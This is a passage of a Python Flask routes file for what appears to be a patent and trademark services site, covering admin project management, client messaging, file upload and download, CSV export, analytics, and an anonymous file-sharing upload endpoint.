            'status': project.status,
            'created_at': project.created_at.isoformat(),
            'user_id': project.user_id,
            'client_name': f"{project.user.first_name} {project.user.last_name}",
            'client_email': project.user.email,
            'file_count': file_count,
            'last_message': last_message.created_at.isoformat() if last_message else None,
            'days_until_due': project.get_days_until_due(),
            'has_new_messages': new_messages_count > 0,
            'new_messages_count': new_messages_count  # Client messages unseen by admin
        })
    
    # Calculate statistics
    total = len(projects_data)
    active = len([p for p in projects_data if p['days_until_due'] >= 0 and p['status'] != 'completed'])
    overdue = len([p for p in projects_data if p['days_until_due'] < 0 and p['status'] != 'completed'])
    completed = len([p for p in projects_data if p['status'] == 'completed'])
    new_messages = sum([p['new_messages_count'] for p in projects_data])
    
    return jsonify({
        'success': True,
        'projects': projects_data,
        'statistics': {
            'total': total,
            'active': active,
            'overdue': overdue,
            'completed': completed,
            'new_messages': new_messages  # Total client messages unseen by admin
        }
    })


@main_bp.route('/admin/get-project-statistics')
@admin_required
def get_project_statistics():
    total = Project.query.count()
    active = Project.query.filter(Project.status != 'completed').count()
    completed = Project.query.filter_by(status='completed').count()
    
    # Calculate overdue projects
    today = date.today()
    overdue = Project.query.filter(
        Project.due_date < today,
        Project.status != 'completed'
    ).count()
    
    # Get new messages (client messages not seen by admin)
    new_messages = ProjectMessage.query.filter_by(
        is_admin=False,  # Client messages
        is_seen=False    # Not seen by admin
    ).count()
    
    # Get total clients
    total_clients = User.query.filter_by(role='user').count()
    
    return jsonify({
        'success': True,
        'total': total,
        'active': active,
        'overdue': overdue,
        'completed': completed,
        'new_messages': new_messages,  # This now counts client messages unseen by admin
        'total_clients': total_clients
    })



@main_bp.route('/admin/add-new-project', methods=['POST'])
@admin_required
def add_new_project():
    if request.method == 'POST':
        data = request.form
        
        # Create new project
        if data.get('action') == 'create_project':
            try:
                # Generate unique RefID
                import uuid
                ref_id = f"PROJ-{uuid.uuid4().hex[:8].upper()}"
                
                # Get form data
                name = data.get('name')
                client_id = data.get('client_id')
                description = data.get('description', '')
                due_date_str = data.get('due_date')
                category = data.get('category', 'Other')
                budget = data.get('budget', 0.0)
                
                if not name:
                    return jsonify({'success': False, 'error': 'Project name is required'})
                
                if not due_date_str:
                    return jsonify({'success': False, 'error': 'Due date is required'})

                if not User.query.filter_by(id=client_id,role='user').first():
                    return jsonify({'success': False, 'error': 'Client not found. <a href="/Add-User">Add new client</a> before creating project.'})
                
                # Create project
                project = Project(
                    user_id=client_id,
                    name=name,
                    ref_id=ref_id,
                    description=description,
                    due_date=datetime.strptime(due_date_str, '%Y-%m-%d').date(),
                    status='active',
                    category=category,
                    budget=float(budget) if budget else 0.0
                )
                db.session.add(project)
                db.session.flush()  # Get project.id without committing
                

                project_msg = ProjectMessage(
                    project_id=project.id,
                    user_id = 6,
                    message=project.description,
                    is_admin=False
                )

                db.session.add(project_msg)

                # Create user folder structure
                user_folder = os.path.join('projects_data', f"user_{client_id}")
                project_folder = os.path.join(user_folder, f"project_{project.id}")
                os.makedirs(project_folder, exist_ok=True)
                
                # Handle file uploads
                files_list = request.files.getlist('files[]')  # Store once
                files_count = len(files_list)
                print(f"Processing {files_count} files")     


                uploaded_files = []
                
                for file in files_list:
                    if file and file.filename and file.filename.strip():
                        # Create secure filename
                        filename = secure_filename(file.filename)
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        unique_filename = f"{timestamp}_{filename}"
                        
                        # Save file
                        filepath = os.path.join(project_folder, unique_filename)
                        file.save(filepath)
                        
                        # Save file record to database
                        project_file = ProjectFile(
                            project_id=project.id,
                            filename=filename,
                            file_path=filepath,
                            file_type=filename.split('.')[-1] if '.' in filename else '',
                            file_size=os.path.getsize(filepath),
                            uploaded_by=client_id
                        )
                        db.session.add(project_file)
                        uploaded_files.append(filename)
                
                # Commit everything
                db.session.commit()
                
                return jsonify({
                    'success': True,
                    'project_id': project.id,
                    'ref_id': ref_id,
                    'message': 'Project created successfully!',
                    'uploaded_files': uploaded_files
                })
                
            except ValueError as e:
                db.session.rollback()
                return jsonify({'success': False, 'error': f'Invalid data: {str(e)}'})
            except Exception as e:
                db.session.rollback()
                return jsonify({'success': False, 'error': str(e)})

    return render_template('admin-projects.html')



@main_bp.route('/admin/api/mark-messages-seen/<int:project_id>', methods=['POST'])
@admin_required
def mark_messages_seen(project_id):
    """Mark all client messages in a project as seen by admin"""
    try:
        # Get current admin ID from session
        admin_id = session.get('admin_id')
        if not admin_id:
            return jsonify({'success': False, 'error': 'Admin not logged in'}), 401
        
        # Mark all client messages as seen
        updated_count = ProjectMessage.query.filter_by(
            project_id=project_id,
            is_admin=False,  # Client messages
            is_seen=False
        ).update({'is_seen': True, 'seen_at': datetime.utcnow()})
        
        db.session.commit()
        
        return jsonify({
            'success': True, 
            'count': updated_count,
            'message': f'Marked {updated_count} client messages as seen'
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/get-unseen-message-count/<int:project_id>')
@admin_required
def get_unseen_message_count(project_id):
    """Get count of unseen client messages for admin"""
    try:
        unseen_count = ProjectMessage.query.filter_by(
            project_id=project_id,
            is_admin=False,  # Client messages
            is_seen=False   # Not seen by admin
        ).count()
        
        return jsonify({
            'success': True,
            'unseen_count': unseen_count
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500
        

    
@main_bp.route('/admin/get-all-clients')
@admin_required
def get_all_clients():
    clients = User.query.filter(User.role == 'user').all()
    clients_data = []
    for client in clients:
        clients_data.append({
            'id': client.id,
            'name': f"{client.first_name} {client.last_name}",
            'email': client.email,
            'project_count': Project.query.filter_by(user_id=client.id).count()
        })
    
    return jsonify({'success': True, 'clients': clients_data})

@main_bp.route('/admin/get-project-info/<int:project_id>')
@admin_required
def admin_get_project_info(project_id):
    project = Project.query.get_or_404(project_id)
    client = User.query.get(project.user_id)
    
    return jsonify({
        'success': True,
        'project': {
            'id': project.id,
            'name': project.name,
            'ref_id': project.ref_id,
            'description': project.description,
            'due_date': project.due_date.isoformat(),
            'status': project.status,
            'created_at': project.created_at.isoformat()
        },
        'client': {
            'id': client.id,
            'name': f"{client.first_name} {client.last_name}",
            'email': client.email
        }
    })

@main_bp.route('/admin/get-project-messages/<int:project_id>')
@admin_required
def admin_get_project_messages(project_id):
    messages = ProjectMessage.query\
        .options(db.joinedload(ProjectMessage.attached_file))\
        .filter_by(project_id=project_id)\
        .order_by(ProjectMessage.created_at.asc())\
        .all()
    
    messages_data = []
    for msg in messages:
        user = User.query.get(msg.user_id)
        sender_name = "Admin" if msg.is_admin else f"{user.first_name} {user.last_name}"
        
        message_data = {
            'id': msg.id,
            'message': msg.message,
            'is_admin': msg.is_admin,
            'is_seen': msg.is_seen,  # ADD THIS LINE
            'created_at': msg.created_at.strftime('%Y-%m-%d %H:%M'),
            'has_file': bool(msg.file_id),
            'sender': sender_name           
        }

        # Add file info if exists
        if msg.attached_file:
            file = msg.attached_file
            message_data['file'] = {
                'id': file.id,
                'filename': file.filename,
                'file_type': file.file_type,
                'file_size': file.file_size,
                'uploaded_at': file.uploaded_at.strftime('%Y-%m-%d %H:%M') if file.uploaded_at else None
            }
        
        messages_data.append(message_data)
    
    return jsonify(messages_data)


@main_bp.route('/admin/download-project-file/<int:file_id>')
@admin_required
def download_project_file_asAdmin(file_id):
    
    file_record = ProjectFile.query.get_or_404(file_id)
    
    # Verify user has access to this file
    project = Project.query.get_or_404(file_record.project_id)

    directory = os.path.dirname(file_record.file_path)
    filename = os.path.basename(file_record.file_path)
    
    return send_from_directory(directory, filename, as_attachment=True)    






@main_bp.route('/admin/send-message', methods=['POST'])
@admin_required
def admin_send_message():
    try:
        # Handle both FormData (with file) and JSON (without file)
        file_data = None
        if 'multipart/form-data' in request.content_type:
            data = request.form.to_dict()
            file_data = request.files.get('file')
        else:
            data = request.get_json()
        
        print(f"DEBUG: Action: {data.get('action')}")
        print(f"DEBUG: Has file: {bool(file_data)}")

        if data.get('action') == 'send_message':
            print("DEBUG: admin_send_message called")
            project_id = data.get('project_id')
            message = data.get('message', '').strip()
            
            if not project_id:
                return jsonify({'success': False, 'error': 'Project ID is required'})
            
            # Allow sending file without text
            if not message and not file_data:
                return jsonify({'success': False, 'error': 'Please type a message or attach a file'})
            
            # Verify project exists and user has access
            project = Project.query.get(project_id)

            file_id = None
            
            # Handle file upload if present (OPTIONAL)
            if file_data and file_data.filename:
                try:
                    # Validate file size (10MB limit)
                    file_data.seek(0, 2)  # Seek to end
                    file_size = file_data.tell()
                    file_data.seek(0)  # Reset to beginning
                    
                    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
                    if file_size > MAX_FILE_SIZE:
                        return jsonify({
                            'success': False, 
                            'error': f'File too large. Maximum size is 10MB'
                        })
                    
                    # Create secure filename
                    filename = secure_filename(file_data.filename)
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    unique_filename = f"{timestamp}_{filename}"
                    
                    # Save file to disk
                    user_folder = os.path.join('projects_data', f"user_{session['admin_id']}")
                    project_folder = os.path.join(user_folder, f"project_{project_id}")
                    os.makedirs(project_folder, exist_ok=True)
                    
                    filepath = os.path.join(project_folder, unique_filename)
                    file_data.save(filepath)
                    
                    # Save file record to database
                    project_file = ProjectFile(
                        project_id=project_id,
                        filename=filename,
                        file_path=filepath,
                        file_type=filename.split('.')[-1].lower() if '.' in filename else '',
                        file_size=file_size,
                        uploaded_by=session['admin_id'],
                    )
                    
                    db.session.add(project_file)
                    db.session.flush()  # Get the file ID without committing
                    file_id = project_file.id
                    
                    print(f"DEBUG: File saved - ID: {file_id}, Name: {filename}")
                    
                except Exception as file_error:
                    print(f"DEBUG: File upload error: {str(file_error)}")
                    # Don't fail the whole request if file upload fails
                    # Continue without file attachment
            
            # Save the message (with or without file)
            project_msg = ProjectMessage(
                project_id=project_id,
                user_id=session['admin_id'],
                message=message or '[File attached]',
                is_admin=True,
                is_seen=False,  # IMPORTANT: Admin messages start as unseen by client
                file_id=file_id  # Link to file if exists
            )
            
            db.session.add(project_msg)
            db.session.commit()
            
            print(f"DEBUG: Message saved - ID: {project_msg.id}")
            print(f"DEBUG: is_seen status: {project_msg.is_seen}")
            
            return jsonify({
                'success': True, 
                'message_id': project_msg.id,
                'has_file': bool(file_id),
                'file_id': file_id,
                'is_seen': False  # Add this to response
            })
        
        return jsonify({'success': False, 'error': 'Invalid action'})
        
    except Exception as e:
        db.session.rollback()
        print(f"DEBUG: Error in api_send_message: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}) 


        

@main_bp.route('/admin/get-project-files/<int:project_id>')
@admin_required
def admin_get_project_files(project_id):
    files = ProjectFile.query.filter_by(project_id=project_id)\
        .order_by(ProjectFile.uploaded_at.desc())\
        .all()
    
    files_data = []
    for file in files:
        uploader = User.query.get(file.uploaded_by)
        uploader_name = "Admin" if uploader and uploader.role == 'admin' else f"{uploader.first_name} {uploader.last_name}" if uploader else "Unknown"
        
        files_data.append({
            'id': file.id,
            'filename': file.filename,
            'file_type': file.file_type,
            'file_size': file.file_size,
            'uploaded_at': file.uploaded_at.isoformat(),
            'uploaded_by': uploader_name
        })
    
    return jsonify(files_data)

@main_bp.route('/admin/upload-file', methods=['POST'])
@admin_required
def admin_upload_file():
    try:
        project_id = request.form.get('project_id')
        file = request.files.get('file')
        
        if not project_id or not file:
            return jsonify({'success': False, 'error': 'Missing required data'})
        
        project = Project.query.get(project_id)
        if not project:
            return jsonify({'success': False, 'error': 'Project not found'})
        
        # Create secure filename
        filename = secure_filename(file.filename)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        unique_filename = f"{timestamp}_{filename}"
        
        # Define upload path
        user_folder = os.path.join('projects_data', f"user_{project.user_id}")
        project_folder = os.path.join(user_folder, f"project_{project_id}")
        os.makedirs(project_folder, exist_ok=True)
        
        filepath = os.path.join(project_folder, unique_filename)
        file.save(filepath)
        
        # Save file record
        project_file = ProjectFile(
            project_id=project_id,
            filename=filename,
            file_path=filepath,
            file_type=filename.split('.')[-1] if '.' in filename else '',
            file_size=os.path.getsize(filepath),
            uploaded_by=1  # Admin user ID
        )
        db.session.add(project_file)
        db.session.commit()
        
        return jsonify({'success': True, 'filename': filename})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)})



@main_bp.route('/admin/download-file/<int:file_id>')
@admin_required
def admin_download_file(file_id):
    file_record = ProjectFile.query.get_or_404(file_id)
    
    directory = os.path.dirname(file_record.file_path)
    filename = os.path.basename(file_record.file_path)
    
    return send_from_directory(directory, filename, as_attachment=True)



@main_bp.route('/admin/project-details/<int:project_id>')
@admin_required
def admin_project_details(project_id):
    project = Project.query.get_or_404(project_id)
    return jsonify({
        'id': project.id,
        'name': project.name,
        'user_id': project.user_id,
        'ref_id': project.ref_id,
        'description': project.description,
        'due_date': project.due_date.isoformat(),
        'status': project.status,
        'created_at': project.created_at.isoformat(),
        'updated_at': project.updated_at.isoformat()
    })



@main_bp.route('/admin/api/delete-project/<int:project_id>', methods=['DELETE'])
@admin_required
def admin_delete_project(project_id):
    """Delete a project (admin only)"""
    try:
        project = Project.query.get_or_404(project_id)
        
        # Delete associated files
        files = ProjectFile.query.filter_by(project_id=project_id).all()
        for file in files:
            try:
                if os.path.exists(file.file_path):
                    os.remove(file.file_path)
            except:
                pass
            db.session.delete(file)
        
        # Delete messages
        messages = ProjectMessage.query.filter_by(project_id=project_id).delete()
        
        # Delete project
        db.session.delete(project)
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'Project deleted successfully'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/project/<int:project_id>/complete', methods=['POST'])
@admin_required
def admin_complete_project(project_id):
    """Mark project as completed"""
    try:
        project = Project.query.get_or_404(project_id)
        
        data = request.get_json()
        notes = data.get('notes', '')
        
        project.status = 'completed'
        project.completed_at = datetime.now()
        project.completion_notes = notes
        
        # Create completion message
        completion_msg = ProjectMessage(
            project_id=project_id,
            user_id=session['admin_id'],
            message=f'Project marked as completed. {notes}' if notes else 'Project marked as completed.',
            is_admin=True
        )
        db.session.add(completion_msg)
        
        db.session.commit()
        
        return jsonify({
            'success': True, 
            'message': 'Project marked as completed',
            'project': {
                'id': project.id,
                'name': project.name,
                'status': project.status,
                'completed_at': project.completed_at.isoformat() if project.completed_at else None
            }
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/project/<int:project_id>/reopen', methods=['POST'])
@admin_required
def admin_reopen_project(project_id):
    """Reopen a completed project"""
    try:
        project = Project.query.get_or_404(project_id)
        
        if project.status != 'completed':
            return jsonify({'success': False, 'error': 'Project is not completed'}), 400
            
        project.status = 'active'
        project.completed_at = None
        project.completion_notes = None
        
        # Create reopening message
        reopen_msg = ProjectMessage(
            project_id=project_id,
            user_id=session['admin_id'],
            message='Project reopened by admin.',
            is_admin=True
        )
        db.session.add(reopen_msg)
        
        db.session.commit()
        
        return jsonify({
            'success': True, 
            'message': 'Project reopened successfully',
            'project': {
                'id': project.id,
                'name': project.name,
                'status': project.status
            }
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/project/<int:project_id>/extend-due-date', methods=['POST'])
@admin_required
def admin_extend_due_date(project_id):
    """Extend project due date"""
    try:
        project = Project.query.get_or_404(project_id)
        
        data = request.get_json()
        new_due_date = data.get('due_date')
        
        if not new_due_date:
            return jsonify({'success': False, 'error': 'New due date is required'}), 400
            
        old_due_date = project.due_date
        project.due_date = datetime.strptime(new_due_date, '%Y-%m-%d')
        
        # Create extension message
        extension_msg = ProjectMessage(
            project_id=project_id,
            user_id=session['admin_id'],
            message=f'Due date extended from {old_due_date.strftime("%Y-%m-%d")} to {project.due_date.strftime("%Y-%m-%d")}',
            is_admin=True
        )
        db.session.add(extension_msg)
        
        db.session.commit()
        
        return jsonify({
            'success': True, 
            'message': 'Due date extended successfully',
            'project': {
                'id': project.id,
                'name': project.name,
                'due_date': project.due_date.isoformat()
            }
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/get-client-projects/<int:client_id>')
@admin_required
def get_client_projects(client_id):
    """Get all projects for a specific client"""
    try:
        client = User.query.get_or_404(client_id)
        
        projects = Project.query.filter_by(user_id=client_id)\
            .order_by(Project.created_at.desc())\
            .all()
        
        projects_data = []
        for project in projects:
            file_count = ProjectFile.query.filter_by(project_id=project.id).count()
            last_message = ProjectMessage.query.filter_by(project_id=project.id)\
                .order_by(ProjectMessage.created_at.desc())\
                .first()
            
            projects_data.append({
                'id': project.id,
                'name': project.name,
                'ref_id': project.ref_id,
                'status': project.status,
                'due_date': project.due_date.isoformat(),
                'created_at': project.created_at.isoformat(),
                'file_count': file_count,
                'last_message': last_message.created_at.isoformat() if last_message else None,
                'days_until_due': project.get_days_until_due()
            })
        
        return jsonify({
            'success': True,
            'client': {
                'id': client.id,
                'name': f"{client.first_name} {client.last_name}",
                'email': client.email
            },
            'projects': projects_data,
            'total': len(projects_data)
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/delete-message/<int:message_id>', methods=['DELETE'])
@admin_required
def admin_delete_message(message_id):
    """Delete a message (admin only)"""
    try:
        message = ProjectMessage.query.get_or_404(message_id)
        
        # Check if message has file
        if message.file_id:
            file = ProjectFile.query.get(message.file_id)
            if file:
                # Only delete file if it's not referenced by other messages
                other_messages = ProjectMessage.query.filter_by(file_id=file.id).count()
                if other_messages <= 1:
                    try:
                        if os.path.exists(file.file_path):
                            os.remove(file.file_path)
                    except:
                        pass
                    db.session.delete(file)
        
        db.session.delete(message)
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'Message deleted successfully'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/delete-file/<int:file_id>', methods=['DELETE'])
@admin_required
def admin_delete_file(file_id):
    """Delete a file (admin only)"""
    try:
        file = ProjectFile.query.get_or_404(file_id)
        
        # Delete physical file
        try:
            if os.path.exists(file.file_path):
                os.remove(file.file_path)
        except Exception as e:
            print(f"Error deleting physical file: {e}")
        
        # Update messages that reference this file
        messages = ProjectMessage.query.filter_by(file_id=file_id).all()
        for msg in messages:
            msg.file_id = None
            msg.message = msg.message.replace('[File attached]', '[File deleted by admin]')
        
        db.session.delete(file)
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'File deleted successfully'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/get-recent-activities')
@admin_required
def get_recent_activities():
    """Get recent activities across all projects"""
    try:
        # Get recent messages
        recent_messages = ProjectMessage.query\
            .order_by(ProjectMessage.created_at.desc())\
            .limit(20)\
            .all()
        
        # Get recent file uploads
        recent_files = ProjectFile.query\
            .order_by(ProjectFile.uploaded_at.desc())\
            .limit(10)\
            .all()
        
        # Get recently completed projects
        recent_completed = Project.query\
            .filter(Project.status == 'completed')\
            .order_by(Project.completed_at.desc())\
            .limit(5)\
            .all()
        
        activities = []
        
        # Add messages to activities
        for msg in recent_messages:
            project = Project.query.get(msg.project_id)
            user = User.query.get(msg.user_id)
            activities.append({
                'type': 'message',
                'id': msg.id,
                'project_id': msg.project_id,
                'project_name': project.name if project else 'Unknown',
                'user_name': f"{user.first_name} {user.last_name}" if user else 'Unknown',
                'is_admin': msg.is_admin,
                'message': msg.message[:100] + '...' if len(msg.message) > 100 else msg.message,
                'created_at': msg.created_at.isoformat(),
                'has_file': bool(msg.file_id)
            })
        
        # Add file uploads to activities
        for file in recent_files:
            project = Project.query.get(file.project_id)
            user = User.query.get(file.uploaded_by)
            activities.append({
                'type': 'file_upload',
                'id': file.id,
                'project_id': file.project_id,
                'project_name': project.name if project else 'Unknown',
                'user_name': f"{user.first_name} {user.last_name}" if user else 'Unknown',
                'filename': file.filename,
                'file_type': file.file_type,
                'created_at': file.uploaded_at.isoformat() if file.uploaded_at else None
            })
        
        # Add completed projects to activities
        for project in recent_completed:
            user = User.query.get(project.user_id)
            activities.append({
                'type': 'project_completed',
                'id': project.id,
                'project_name': project.name,
                'user_name': f"{user.first_name} {user.last_name}" if user else 'Unknown',
                'completed_at': project.completed_at.isoformat() if project.completed_at else None,
                'ref_id': project.ref_id
            })
        
        # Sort activities by date
        activities.sort(key=lambda x: x['created_at'] if x.get('created_at') else x.get('completed_at', ''), reverse=True)
        
        return jsonify({
            'success': True,
            'activities': activities[:30]  # Return top 30 activities
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/send-bulk-message', methods=['POST'])
@admin_required
def send_bulk_message():
    """Send message to multiple projects"""
    try:
        data = request.get_json()
        project_ids = data.get('project_ids', [])
        message = data.get('message', '').strip()
        
        if not project_ids:
            return jsonify({'success': False, 'error': 'No projects selected'}), 400
            
        if not message:
            return jsonify({'success': False, 'error': 'Message is required'}), 400
        
        sent_count = 0
        for project_id in project_ids:
            try:
                project = Project.query.get(project_id)
                if project:
                    project_msg = ProjectMessage(
                        project_id=project_id,
                        user_id=session['admin_id'],
                        message=message,
                        is_admin=True
                    )
                    db.session.add(project_msg)
                    sent_count += 1
            except:
                continue
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'message': f'Message sent to {sent_count} project(s)',
            'sent_count': sent_count
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/export-projects', methods=['POST'])
@admin_required
def export_projects():
    """Export projects data to CSV"""
    try:
        data = request.get_json()
        filter_type = data.get('filter', 'all')
        
        # Build query based on filter
        query = Project.query.join(User)
        
        if filter_type == 'active':
            query = query.filter(Project.status != 'completed')
        elif filter_type == 'completed':
            query = query.filter(Project.status == 'completed')
        elif filter_type == 'overdue':
            today = date.today()
            query = query.filter(Project.due_date < today, Project.status != 'completed')
        
        projects = query.order_by(Project.created_at.desc()).all()
        
        # Create CSV data
        import csv
        import io
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow([
            'Project ID', 'Reference ID', 'Project Name', 'Client Name', 
            'Client Email', 'Description', 'Status', 'Due Date', 
            'Created Date', 'File Count', 'Days Until Due'
        ])
        
        # Write data
        for project in projects:
            file_count = ProjectFile.query.filter_by(project_id=project.id).count()
            days_until_due = project.get_days_until_due()
            
            writer.writerow([
                project.id,
                project.ref_id,
                project.name,
                f"{project.user.first_name} {project.user.last_name}",
                project.user.email,
                project.description or '',
                project.status,
                project.due_date.strftime('%Y-%m-%d'),
                project.created_at.strftime('%Y-%m-%d'),
                file_count,
                days_until_due
            ])
        
        # Create response
        output.seek(0)
        return Response(
            output.getvalue(),
            mimetype="text/csv",
            headers={"Content-disposition": f"attachment; filename=projects_export_{filter_type}_{date.today()}.csv"}
        )
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/admin/api/get-project-analytics')
@admin_required
def get_project_analytics():
    """Get analytics data for projects"""
    try:
        # Get total counts
        total_projects = Project.query.count()
        total_clients = User.query.filter_by(role='user').count()
        
        # Get status counts
        active_projects = Project.query.filter(Project.status != 'completed').count()
        completed_projects = Project.query.filter_by(status='completed').count()
        
        # Get overdue count
        today = date.today()
        overdue_projects = Project.query.filter(
            Project.due_date < today,
            Project.status != 'completed'
        ).count()
        
        # Get monthly project creation stats
        from sqlalchemy import extract
        from datetime import datetime, timedelta
        
        six_months_ago = datetime.now() - timedelta(days=180)
        
        monthly_stats = db.session.query(
            extract('year', Project.created_at).label('year'),
            extract('month', Project.created_at).label('month'),
            db.func.count(Project.id).label('count')
        ).filter(
            Project.created_at >= six_months_ago
        ).group_by(
            'year', 'month'
        ).order_by(
            'year', 'month'
        ).all()
        
        # Format monthly stats
        monthly_data = []
        for stat in monthly_stats:
            monthly_data.append({
                'month': f"{int(stat.month)}/{int(stat.year)}",
                'count': stat.count
            })
        
        # Get client with most projects
        from sqlalchemy import func
        
        top_client = db.session.query(
            User.id,
            User.first_name,
            User.last_name,
            func.count(Project.id).label('project_count')
        ).join(Project, User.id == Project.user_id)\
         .group_by(User.id)\
         .order_by(func.count(Project.id).desc())\
         .first()
        
        top_client_data = None
        if top_client:
            top_client_data = {
                'id': top_client.id,
                'name': f"{top_client.first_name} {top_client.last_name}",
                'project_count': top_client.project_count
            }
        
        return jsonify({
            'success': True,
            'analytics': {
                'total_projects': total_projects,
                'total_clients': total_clients,
                'active_projects': active_projects,
                'completed_projects': completed_projects,
                'overdue_projects': overdue_projects,
                'completion_rate': round((completed_projects / total_projects * 100), 2) if total_projects > 0 else 0,
                'monthly_stats': monthly_data,
                'top_client': top_client_data
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



























# logics for join us page job application form

@main_bp.route('/Join-Us')
def join_us():
    return render_template('/job-app.html')













@main_bp.route('/Legal-Consultants')
def Total():
    return render_template('/Legal-Consultants.html')


@main_bp.route('/Patent-Services')
def ptserv():
    return render_template("/patentservices.html")

@main_bp.route('/Trademark-Services')
def tmserv():
    return render_template("/tmservices.html")


@main_bp.route('/Drawings-Illustration')
def Dwgserv():
        return render_template("/drawings.html")


@main_bp.route('/Contact-Us')
def con():
    return render_template("/contact.html")


@main_bp.route('/test')
def tes():
     return render_template("/test.html")

@main_bp.route('/Error-404')
def page_not_found():
    return render_template('/Error-404.html')



from docket.routes import get_current_user_id, get_current_user, get_current_user_name, is_user_logged_in

# Add this helper function at the top of your main_bp routes file
def get_current_session_user():
    """
    Get current user information from either admin or user session
    Returns: (is_logged_in, user_id, user_name)
    """
    # Check admin session first
    if session.get('admin_logged_in', False):
        return (
            True,
            session.get('admin_id'),
            session.get('admin_Fname', 'Admin')
        )
    
    # Check regular user session
    if is_user_logged_in():
        return (
            True,
            get_current_user_id(),
            get_current_user_name()
        )
    
    # Guest user
    return (False, None, 'Guest')


    
# Routes to share files with anyone or with logged in users without creating project or messages. (Admin can delete these files from template folder)
# Routes to share files with anyone - No login required for uploading
UPLOAD_FOLDER = 'shared_files/shared'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@main_bp.route('/Share_file')
def Share_files():
    """Render the file management page for docket users"""
    is_logged_in, user_id, user_name = get_current_session_user()
    
    # Use the user-specific template
    return render_template('Camp/share_file.html',
                         is_logged_in=is_logged_in,
                         user_id=user_id,
                         user_name=user_name)







@main_bp.route('/api/upload-file', methods=['POST'])
def upload_file():
    """Upload a file and generate shareable link - Anyone can upload"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'}), 400
        
        # Validate file size
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > 50 * 1024 * 1024:
            return jsonify({'success': False, 'error': 'File size exceeds 50MB limit'}), 400
        
        # Get user information using helper function
        is_logged_in, user_id, user_name = get_current_session_user()
        session_id = request.cookies.get('session_id', str(uuid.uuid4()))
        
        # Secure filename and save
        original_filename = secure_filename(file.filename)
        unique_filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}_{original_filename}"
        file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
        
        # Save file
        file.save(file_path)
        
        # Generate share token
        share_token = uuid.uuid4().hex[:16]
        share_url = url_for('main.access_shared_file', token=share_token, _external=True)
        
        # Create database record
        shared_file = SharedFile(
            user_id=user_id,
            session_id=session_id if not user_id else None,
            filename=unique_filename,
            original_filename=original_filename,
            file_path=file_path,
            file_type=request.form.get('file_type', 'other'),
            category=request.form.get('category', 'other'),
            description=request.form.get('description', ''),
            file_size=file_size,
            share_token=share_token,
            share_url=share_url,
            uploader_ip=request.remote_addr,
            user_agent=request.headers.get('User-Agent', '')
        )
        
        db.session.add(shared_file)
        db.session.commit()
        
        # Prepare response
        response_data = {
            'success': True,
            'file_id': shared_file.id,
            'share_url': share_url,
            'filename': original_filename,
            'file_size': format_file_size(file_size),
            'message': 'File uploaded successfully',
            'is_logged_in': is_logged_in,
            'user_name': user_name
        }
        
        # Set session cookie for guests
        if not is_logged_in and not request.cookies.get('session_id'):
            resp = jsonify(response_data)
            resp.set_cookie('session_id', session_id, max_age=365*24*60*60)
            return resp
        
        return jsonify(response_data)
        
    except Exception as e:
        db.session.rollback()
        print(f"Upload error: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/api/my-files', methods=['GET'])
def get_my_files():
    """Get files uploaded by current user (logged in or session-based)"""
    try:
        is_logged_in, user_id, _ = get_current_session_user()
        
        if is_logged_in and user_id:
            # Logged in user - get files by user_id
            files = SharedFile.query.filter_by(
                user_id=user_id,
                is_deleted=False
            ).order_by(SharedFile.created_at.desc()).all()
        else:
            # Guest user - get files by session_id
            session_id = request.cookies.get('session_id')
            if not session_id:
                return jsonify({'success': True, 'files': [], 'total_files': 0, 'is_logged_in': False})
            
            files = SharedFile.query.filter_by(
                session_id=session_id,
                is_deleted=False
            ).order_by(SharedFile.created_at.desc()).all()
        
        files_data = []
        total_size = 0
        for file in files:
            total_size += file.file_size or 0
            files_data.append({
                'id': file.id,
                'original_filename': file.original_filename,
                'file_type': file.file_type,
                'category': file.category,
                'description': file.description,
                'upload_date': file.created_at.isoformat(),
                'file_size': file.file_size,
                'formatted_size': format_file_size(file.file_size),
                'download_count': file.download_count,
                'share_url': file.share_url,
                'share_token': file.share_token
            })
        
        return jsonify({
            'success': True, 
            'files': files_data,
